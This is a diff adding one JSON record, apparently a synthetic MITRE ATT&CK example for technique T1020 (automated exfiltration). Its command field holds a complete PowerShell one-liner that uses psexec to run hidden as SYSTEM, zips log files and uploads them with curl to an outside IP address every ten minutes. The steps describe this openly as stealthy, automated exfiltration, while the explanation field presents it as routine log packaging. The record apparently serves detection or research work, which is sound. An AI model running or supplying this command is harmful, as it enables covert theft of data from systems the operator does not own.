@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ $tmp=Join-Path $env:TEMP ('sys-' + (Get-Date -Format yyyyMMddHHmmss) + '.zip'); if (Test-Path 'C:\\ProgramData\\Diagnostics'){ Compress-Archive -Path 'C:\\ProgramData\\Diagnostics\\*.log' -DestinationPath $tmp -Force 2>$null; if (Test-Path $tmp){ curl -s -X POST -H 'Content-Type: application/zip' --data-binary @$tmp https://198.51.100.60/api/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Move-Item -Force $tmp (Join-Path $sent ([IO.Path]::GetFileName($tmp))) } else { Remove-Item -Force $tmp } } }; Start-Sleep 600 }\"",
+  "explanation": "Automates periodic packaging of diagnostic logs into a zip and posts them to an external HTTP endpoint using curl. Successfully sent bundles are archived to prevent re-sending.",
+  "rationale_steps": [
+    "Elevate and detach with PSExec to run stealthily as SYSTEM.",
+    "Compress targeted logs into a timestamped archive for efficient transfer.",
+    "Upload via HTTP POST with curl in silent mode and suppress outputs.",
+    "Move or remove the archive based on transfer success to avoid duplicates.",
+    "Repeat on a timer to maintain automated exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-6f484c31",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
